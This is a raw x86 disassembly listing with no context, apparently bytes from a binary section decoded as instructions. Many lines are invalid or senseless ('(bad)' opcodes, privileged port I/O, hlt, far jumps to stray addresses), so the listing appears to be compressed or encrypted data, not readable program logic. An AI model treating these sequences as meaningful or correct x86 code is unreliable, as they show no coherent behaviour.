  42fcc7:	dec    edx
  42fcc8:	ds icebp 
  42fcca:	aam    0xdd
  42fccc:	jge    0x42fd1a
  42fcce:	in     eax,0x2
  42fcd0:	pop    edi
  42fcd1:	aas    
  42fcd2:	mov    cl,0xaa
  42fcd4:	jae    0x42fcd3
  42fcd6:	fs xchg ebx,eax
  42fcd8:	jo     0x42fccd
  42fcda:	sub    eax,0x327fcde0
  42fcdf:	mov    al,ds:0x60633b6a
  42fce4:	jae    0x42fd59
  42fce6:	imul   edx,DWORD PTR [edx],0x5d
  42fce9:	aaa    
  42fcea:	push   eax
  42fceb:	xor    BYTE PTR [esi+0x3],ch
  42fcee:	cmp    DWORD PTR [eax+0x63],ecx
  42fcf1:	inc    ebp
  42fcf2:	test   eax,0x5b308441
  42fcf7:	fcomp  DWORD PTR [edi-0x2dddb413]
  42fcfd:	inc    ecx
  42fcfe:	stos   DWORD PTR es:[edi],eax
  42fcff:	jo     0x42fcdf
  42fd01:	inc    eax
  42fd02:	xor    DWORD PTR [edx-0x780018d1],esi
  42fd08:	dec    eax
  42fd09:	sar    BYTE PTR [edi],1
  42fd0b:	lods   al,BYTE PTR ds:[esi]
  42fd0c:	test   BYTE PTR [edi],ch
  42fd0e:	aas    
  42fd0f:	pop    esi
  42fd10:	inc    ebx
  42fd11:	ja     0x42fd7e
  42fd13:	hlt    
  42fd14:	scas   eax,DWORD PTR es:[edi]
  42fd15:	jge    0x42fd19
  42fd17:	and    BYTE PTR [edi+0x16e59769],ch
  42fd1d:	adc    BYTE PTR cs:[edi],cl
  42fd20:	sub    ebx,0xffffffb2
  42fd23:	add    ebx,DWORD PTR [eax+0x8]
  42fd26:	and    bh,BYTE PTR [edi-0x1e73257e]
  42fd2c:	retf   0xa498
  42fd2f:	mov    esp,0x604fdeaf
  42fd34:	(bad)  
  42fd35:	or     DWORD PTR [ecx+0x59],ebp
  42fd38:	dec    edx
  42fd39:	jmp    0x32a6a2b0
  42fd3e:	enter  0x8e6,0x92
  42fd42:	dec    esi
  42fd43:	adc    ebp,DWORD PTR [edx]
  42fd45:	or     dl,BYTE PTR [eax]
  42fd47:	sub    edx,DWORD PTR [ecx+0x1d]
  42fd4a:	mov    edx,0xe66b94ba
  42fd4f:	aas    
  42fd50:	push   0x3fd493fa
  42fd55:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42fd57:	mov    bp,0x2810
  42fd5b:	push   edi
  42fd5c:	pop    edx
  42fd5d:	les    esp,FWORD PTR [esi-0x197204a8]
  42fd63:	fbstp  TBYTE PTR cs:[esi+0x59]
  42fd67:	add    ebp,DWORD PTR [ecx]
  42fd69:	jg     0x42fd08
  42fd6b:	xlat   BYTE PTR ds:[ebx]
  42fd6c:	aaa    
  42fd6d:	jmp    esp
  42fd6f:	mov    ah,0x8a
  42fd71:	and    DWORD PTR [eax+0x76],0x1c0e7475
  42fd78:	cmp    cl,BYTE PTR [edx+0x7fbf19f9]
  42fd7e:	aam    0xfc
  42fd80:	pop    ebx
  42fd81:	fidiv  WORD PTR [edx-0x1cd6de8a]
  42fd87:	jb     0x42fd6c
  42fd89:	out    dx,al
  42fd8a:	in     al,0x80
  42fd8c:	sbb    BYTE PTR [ebx],dl
  42fd8e:	imul   esp,edx,0xffffffb0
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz push 0xffffffdc
  42fe02:	leave  
  42fe03:	lods   al,BYTE PTR ds:[esi]
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x4000001,al
  42fe0d:	in     eax,dx
  42fe0e:	popa   
  42fe0f:	leave  
  42fe10:	cmp    ah,BYTE PTR [ebx]
  42fe12:	test   DWORD PTR [esi+0x34],edx
  42fe15:	sbb    al,0xe9
  42fe17:	ins    BYTE PTR es:[edi],dx
  42fe18:	jecxz  0x42fda8
  42fe1a:	xchg   edi,eax
  42fe1b:	fst    st(0)
  42fe1d:	data16 adc bh,BYTE PTR [ebp-0x7e]
  42fe21:	lock cmp DWORD PTR es:[edx+ebx*8],edx
  42fe26:	in     al,0xf5
  42fe28:	adc    eax,0xaecc2eea
  42fe2d:	xchg   ebx,eax
  42fe2e:	mov    ebp,0x574e2fb9
  42fe33:	in     al,dx
  42fe34:	ins    BYTE PTR es:[edi],dx
  42fe35:	hlt    
  42fe36:	inc    edi
  42fe37:	addr16 mov ch,0xf0
  42fe3a:	push   ds
  42fe3b:	iret   
  42fe3c:	imul   ebx,DWORD PTR [ecx],0xffffffe6
  42fe3f:	xchg   DWORD PTR [edi+0x22],eax
  42fe42:	and    esp,DWORD PTR [edx-0x3a]
  42fe45:	dec    esp
  42fe46:	fst    DWORD PTR [ecx-0x46]
  42fe49:	test   DWORD PTR [ecx+edi*4],edi
  42fe4c:	push   edi
  42fe4d:	je     0x42fe8f
  42fe4f:	sub    BYTE PTR [ebp-0x3e712028],ch
  42fe55:	sub    eax,0xeedfb99d
  42fe5a:	or     DWORD PTR [edi],esi
  42fe5c:	mov    al,ds:0xadab4523
  42fe61:	fstp   TBYTE PTR gs:[eax+0x7761887f]
  42fe68:	mov    ch,0x32
  42fe6a:	js     0x42fe1d
  42fe6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe6d:	add    eax,0x53fcf5b2
  42fe72:	push   ebx
  42fe73:	cmp    eax,0xd1f30e65
  42fe78:	xchg   BYTE PTR [ebp+0x68],bh
  42fe7b:	aas    
  42fe7c:	mov    ah,0x7b
  42fe7e:	mov    ebx,0xe6df6989
  42fe83:	stc    
  42fe84:	or     BYTE PTR [esi+0x2b],dh
  42fe87:	mov    eax,0xb048091f
  42fe8c:	imul   bh
  42fe8e:	mov    ds:0x2dbe4c82,eax
  42fe93:	pop    ebx
  42fe94:	test   BYTE PTR [eax-0x1f86189b],dh
  42fe9a:	push   esp
  42fe9b:	jecxz  0x42feb3
  42fe9d:	test   al,bh
  42fe9f:	mov    esi,ds
  42fea1:	lea    edi,[ecx+0x37]
  42fea4:	sar    BYTE PTR [ebx],cl
  42fea6:	xchg   ecx,eax
  42fea7:	mov    ebx,0x8fbf876f
  42feac:	retf   0x31f3
  42feaf:	sahf   
  42feb0:	es pop es
  42feb2:	adc    bl,BYTE PTR [ebx+0x6741f56f]
  42feb8:	popf   
  42feb9:	dec    eax
  42feba:	inc    esp
  42febb:	sub    al,0x46
  42febd:	adc    al,0xfc
  42febf:	ret    0xa101
  42fec2:	jl     0x42fe83
  42fec4:	clc    
  42fec5:	cmp    BYTE PTR [ecx-0x5a98676f],al
  42fecb:	data16 jns 0x42ff23
  42fece:	mov    ah,0x4c
  42fed0:	push   edx
  42fed1:	ficomp WORD PTR [esi+0x6d478c64]
  42fed7:	int3   
  42fed8:	mov    dh,0xb9
  42feda:	mov    cl,0x8b
  42fedc:	push   edi
  42fedd:	adc    al,BYTE PTR [ecx+0x6fc53a0f]
  42fee3:	dec    ebx
  42fee4:	xor    bl,BYTE PTR [edx-0x66]
  42fee7:	out    0x96,al
  42fee9:	xchg   ebx,eax
  42feea:	mov    eax,0x5f0cc88d
  42feef:	leave  
  42fef0:	pop    ds
  42fef1:	xor    BYTE PTR [eax+0x3f],0xc0
  42fef5:	mov    BYTE PTR [edi-0x142953b],dh
  42fefb:	or     al,0xa6
  42fefd:	xchg   esi,eax
  42fefe:	lds    esp,FWORD PTR [ebx]
  42ff00:	sub    ah,BYTE PTR [esi+ebp*1+0x48810d5f]
  42ff07:	fcom   QWORD PTR [esi-0x66501bc8]
  42ff0d:	les    edi,FWORD PTR ds:0x2e7f
	...
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edx+eiz*2+0x19],0x88
  42ff83:	cmp    esi,DWORD PTR [ebx-0x6ffffdfe]
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    cl,cl
  42ff8d:	out    0x93,eax
  42ff8f:	cmp    BYTE PTR [edi],cl
  42ff91:	push   0xfffffff5
  42ff93:	retf   
  42ff94:	xchg   BYTE PTR [esp+eax*2],bh
  42ff97:	(bad)  
  42ff98:	push   esp
  42ff99:	inc    edx
  42ff9a:	dec    esp
  42ff9b:	cmp    eax,0x48941558
  42ffa0:	test   BYTE PTR [eax-0x67],ah
  42ffa3:	ffree  st(4)
  42ffa5:	clc    
  42ffa6:	cmp    BYTE PTR [edi-0x549f9731],al
  42ffac:	das    
  42ffad:	cmp    al,0xd9
  42ffaf:	loopne 0x42ffd1
  42ffb1:	sub    al,0x6b
  42ffb3:	ins    BYTE PTR es:[edi],dx
  42ffb4:	cmp    DWORD PTR [esi-0x163aae2d],edx
  42ffba:	mov    ebx,0xf0880e41
  42ffbf:	ror    esp,1
  42ffc1:	push   ebx
  42ffc2:	jmp    0xaf1cad18
  42ffc7:	jle    0x42ffe2
  42ffc9:	sbb    dh,BYTE PTR [ecx-0x548d7de7]
  42ffcf:	cld    
  42ffd0:	mov    esp,0x1d24634c
  42ffd5:	dec    esp
  42ffd6:	inc    ebx
  42ffd7:	and    esi,DWORD PTR [esi+0x6c]
  42ffda:	cli    
  42ffdb:	addr16 pop esi
  42ffdd:	xchg   DWORD PTR [eax-0x53],ecx
  42ffe0:	or     al,0x85
  42ffe2:	lahf   
  42ffe3:	adc    eax,0x3ba06f83
  42ffe8:	push   ds
  42ffe9:	push   cs
  42ffea:	fsubrp st(5),st
  42ffec:	push   edi
  42ffed:	pop    ds
  42ffee:	int3   
  42ffef:	sub    ah,BYTE PTR [esi+ecx*2+0x49]
  42fff3:	jecxz  0x42ffc9
  42fff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fff6:	and    al,BYTE PTR [ebp+0x7b]
  42fff9:	mov    esp,DWORD PTR [ecx+0x3a]
  42fffc:	fs push ebp
  42fffe:	in     al,dx
  42ffff:	jae    0x42ff9a
  430001:	in     eax,dx
  430002:	retf   0x3703
  430005:	mov    dh,0x6e
  430007:	xor    BYTE PTR [ecx+edx*8+0x18],ah
  43000b:	sub    al,0x15
  43000d:	and    ecx,eax
  43000f:	push   es
  430010:	sar    DWORD PTR [esi-0x5b],cl
  430013:	cld    
  430014:	shl    ch,cl
  430016:	outs   dx,DWORD PTR ds:[esi]
  430017:	add    BYTE PTR [ebx+0x2479d],ch
	...
  430071:	add    BYTE PTR [eax],al
  430073:	add    BYTE PTR [ebp+0x55],cl
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
